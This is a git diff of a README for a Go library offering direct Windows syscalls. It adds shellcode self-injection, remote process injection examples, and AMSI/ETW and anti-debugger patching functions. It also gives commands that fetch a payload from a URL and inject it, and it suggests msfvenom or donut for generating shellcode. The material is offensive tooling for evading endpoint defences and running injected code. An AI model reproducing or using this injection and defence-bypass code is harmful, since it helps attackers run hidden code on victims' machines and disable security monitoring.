@@ -51,6 +51,8 @@ A Go library providing **TRUE direct Windows API syscalls** using external assem
 - **True Direct Syscalls**: Raw `syscall` instructions with manually resolved syscall numbers
 - **No API Dependencies**: Bypasses `GetProcAddress`, `LoadLibrary`, and all traditional Windows APIs
 - **External Assembly**: Intel NASM assembly compiled separately and linked via cgo
+- **Self-Injection Capability**: Built-in shellcode self-injection using NT APIs and CreateThread
+- **Dual API Support**: Both direct syscalls (NT APIs) and regular Windows API calls via DirectCall
 - **Clean Library Interface**: Simple, easy-to-use functions for any Windows API call
 - **Obfuscation Support**: Function name hashing for stealth operations
 - **Security Bypass**: Built-in AMSI, ETW, and debug protection bypass capabilities  
@@ -82,10 +84,16 @@ import (
 )
 
 func main() {
-    // Allocate memory using direct syscalls
+    // Example 1: Self-injection with embedded shellcode
+    shellcode := []byte{0x50, 0x51, 0x52, /* ... calc shellcode ... */}
+    err := winapi.NtInjectSelfShellcode(shellcode)
+    if err != nil {
+        fmt.Printf("Self-injection failed: %v\n", err)
+    }
+    
+    // Example 2: Manual memory allocation using direct syscalls
     currentProcess := uintptr(0xFFFFFFFFFFFFFFFF) // Current process
     var baseAddress uintptr
-
     size := uintptr(4096)
     
     status, err := winapi.NtAllocateVirtualMemory(
@@ -136,6 +144,7 @@ status, err := winapi.DirectSyscallByHash(hash, args...)
 
 The library provides strongly-typed wrappers for common Windows APIs:
 
+**Direct Syscall Functions (NT APIs):**
 - `NtAllocateVirtualMemory` - Allocate memory in processes
 - `NtWriteVirtualMemory` - Write to process memory  
 - `NtReadVirtualMemory` - Read from process memory
@@ -146,6 +155,13 @@ The library provides strongly-typed wrappers for common Windows APIs:
 - `NtQueryInformationProcess` - Query process information
 - `NtCreateFile` / `NtReadFile` / `NtWriteFile` - File operations
 - `NtClose` - Close handles
+- `NtWaitForSingleObject` - Wait for object signals
+
+**High-Level Functions:**
+- `NtInjectSelfShellcode` - Complete self-injection with CreateThread
+- `DirectCall` - Call any Windows API function by address
+
+**Security Bypass Functions:**
 - `PatchAMSI` - Disable Anti-Malware Scan Interface
 - `PatchETW` - Disable Event Tracing for Windows
 - `PatchDbgUiRemoteBreakin` - Prevent remote debugger attachment
@@ -466,6 +482,8 @@ The library includes comprehensive security bypass capabilities that can disable
 
 ### Available Security Patches
 
+NOTE: USING APPLYALL ON SELF INJECTION WILL CAUSE SEGFAULT FOR REASONS UNBEKNOWNST TO ME
+
 The library provides six different security bypass functions:
 
 1. **PatchAMSI** - Disables Anti-Malware Scan Interface
@@ -701,13 +719,19 @@ func main() {
 The library includes pre-built assembly objects, but you can rebuild them:
 
 ```bash
-# Assemble the syscall function
-nasm -f win64 do_syscall.S -o do_syscall.obj
+# Build script handles both syscall and API call assemblies
+./build.sh
 
-# Create static library
+# Manual build process:
+# 1. Assemble the syscall function
+nasm -f win64 do_syscall.S -o do_syscall.obj
 ar rcs libdo_syscall.a do_syscall.obj
 
-# Build your Go application
+# 2. Assemble the API call function  
+nasm -f win64 do_call.S -o do_call.obj
+ar rcs libdo_call.a do_call.obj
+
+# 3. Build your Go application
 go build
 ```
 
@@ -903,7 +927,13 @@ if status == 0 {
 ### Thread Creation and Injection
 
 ```go
-// Inject shellcode into a remote process
+// Self-injection using built-in function (recommended)
+func SelfInject() error {
+    shellcode := []byte{0x50, 0x51, 0x52, /* ... your shellcode ... */}
+    return winapi.NtInjectSelfShellcode(shellcode)
+}
+
+// Manual remote injection for educational purposes
 func InjectShellcode(processHandle uintptr, shellcode []byte) error {
     // Allocate memory in target process
     var baseAddress uintptr
@@ -970,7 +1000,9 @@ func InjectShellcode(processHandle uintptr, shellcode []byte) error {
         return fmt.Errorf("thread creation failed: 0x%X", status)
     }
     
-    fmt.Printf("Created thread handle: 0x%X\n", threadHandle)
+    // Wait for thread completion
+    timeout := uint64(5000 * 1000 * 10) // 5 seconds
+    winapi.NtWaitForSingleObject(threadHandle, false, &timeout)
     winapi.NtClose(threadHandle)
     
     return nil
@@ -1201,16 +1233,17 @@ bash build.sh
 # Dump all syscalls (no injection, safe for analysis)
 ./cmd.exe -dump
 
-# Run example injection with embedded calc shellcode
+# Self-injection with embedded calc shellcode (default for -example)
 ./cmd.exe -example 
 
-# Run injection with custom payload from URL
+# Explicit self-injection mode
+./cmd.exe -self -url http://example.com/payload.bin
+
+# Remote injection with custom payload (shows process selection)
 ./cmd.exe -url http://example.com/payload.bin
 
-# this will run the main program to list injectible processes, and prompt for a selection
-# the shellcode you're injecting is a simple pop calc shellcode, obviously be smart about running shellcode from github repos
-# so feel free to use donut or msfvenom or similar to generate your own calc shellcode and replace GetEmbeddedShellcode func
-
+# The embedded shellcode is a simple calc.exe payload - replace GetEmbeddedShellcode() 
+# function with your own shellcode generated via donut, msfvenom, etc.
 ```
 ## Detection
 
